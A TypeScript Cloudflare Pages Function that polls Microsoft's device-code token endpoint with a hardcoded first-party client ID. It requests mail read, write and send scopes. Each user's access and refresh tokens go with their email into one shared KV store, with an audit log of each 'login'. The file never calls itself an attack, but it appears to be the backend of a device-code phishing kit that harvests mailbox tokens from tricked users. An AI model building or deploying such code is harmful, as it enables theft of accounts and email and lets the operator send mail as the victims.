interface Env {
  TOKEN_STORE: KVNamespace;
}

const CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
const TOKEN_URL = 'https://login.microsoftonline.com/common/oauth2/token';
const RESOURCE = 'https://graph.microsoft.com';
const SESSIONS_KEY = 'sessions';
const AUDIT_KEY = 'audit_log';

async function fetchUserProfile(accessToken: string): Promise<{ email: string; displayName: string }> {
  try {
    const res = await fetch('https://graph.microsoft.com/v1.0/me', {
      headers: { Authorization: `Bearer ${accessToken}` },
    });
    if (res.ok) {
      const profile = await res.json() as { displayName: string; mail: string; userPrincipalName: string };
      return {
        email: profile.mail || profile.userPrincipalName || 'unknown@user.com',
        displayName: profile.displayName || 'Authenticated User',
      };
    }
  } catch { /* fallthrough */ }
  return { email: 'unknown@user.com', displayName: 'Authenticated User' };
}

function createSession(email: string, displayName: string, expiresIn: number, accessToken: string, refreshToken: string): Record<string, unknown> {
  const now = new Date();
  return {
    id: `sess_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
    accountEmail: email,
    accountName: displayName,
    status: 'active',
    accessToken,
    refreshToken,
    accessTokenExpiry: new Date(now.getTime() + expiresIn * 1000).toISOString(),
    refreshTokenExpiry: new Date(now.getTime() + 90 * 24 * 3600 * 1000).toISOString(),
    lastActivity: now.toISOString(),
    createdAt: now.toISOString(),
    scopes: ['User.Read', 'Mail.Read', 'Mail.ReadWrite', 'Mail.Send', 'MailboxSettings.Read'],
    clientId: CLIENT_ID,
    ipAddress: 'Web Client',
    deviceInfo: 'Web Browser',
    tokenType: 'Bearer',
  };
}

export const onRequestPost: PagesFunction<Env> = async (context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Content-Type': 'application/json',
  };

  try {
    const reqBody = await context.request.json() as { deviceCode: string };

    if (!reqBody.deviceCode) {
      return new Response(
        JSON.stringify({ error: 'deviceCode is required' }),
        { status: 400, headers }
      );
    }

    const body = new URLSearchParams({
      client_id: CLIENT_ID,
      grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
      code: reqBody.deviceCode,
      resource: RESOURCE,
    });

    const response = await fetch(TOKEN_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
    });

    const data = await response.json() as Record<string, unknown>;

    if (!response.ok) {
      const errorCode = data.error as string | undefined;

      if (errorCode === 'authorization_pending') {
        return new Response(JSON.stringify({ status: 'pending' }), { status: 200, headers });
      }
      if (errorCode === 'slow_down') {
        return new Response(JSON.stringify({ status: 'slow_down' }), { status: 200, headers });
      }
      if (errorCode === 'code_expired') {
        return new Response(JSON.stringify({ status: 'expired' }), { status: 200, headers });
      }

      return new Response(
        JSON.stringify({ status: 'error', error: errorCode, description: data.error_description }),
        { status: 200, headers }
      );
    }

    const accessToken = data.access_token as string;
    const refreshToken = (data.refresh_token as string) || '';
    const expiresIn = typeof data.expires_in === 'number' ? data.expires_in : parseInt(data.expires_in as string, 10) || 3600;

    // Fetch user profile and store session in KV
    const profile = await fetchUserProfile(accessToken);
    const session = createSession(profile.email, profile.displayName, expiresIn, accessToken, refreshToken);

    const sessions = (await context.env.TOKEN_STORE.get(SESSIONS_KEY, 'json') as unknown[] | null) ?? [];
    sessions.unshift(session);
    await context.env.TOKEN_STORE.put(SESSIONS_KEY, JSON.stringify(sessions));

    const auditEntry = {
      id: `log_${Date.now()}`,
      timestamp: new Date().toISOString(),
      action: 'login',
      accountEmail: profile.email,
      ipAddress: 'Web Client',
      details: `Device code flow completed. Token expires in ${expiresIn}s.`,
      success: true,
    };
    const audit = (await context.env.TOKEN_STORE.get(AUDIT_KEY, 'json') as unknown[] | null) ?? [];
    audit.unshift(auditEntry);
    if (audit.length > 200) audit.length = 200;
    await context.env.TOKEN_STORE.put(AUDIT_KEY, JSON.stringify(audit));

    return new Response(
      JSON.stringify({
        status: 'complete',
        email: profile.email,
        displayName: profile.displayName,
      }),
      { status: 200, headers }
    );
  } catch (error) {
    const message = error instanceof Error ? error.message : 'Unknown error';
    return new Response(JSON.stringify({ error: message }), { status: 500, headers });
  }
};

export const onRequestOptions: PagesFunction<Env> = async () => {
  return new Response(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
};
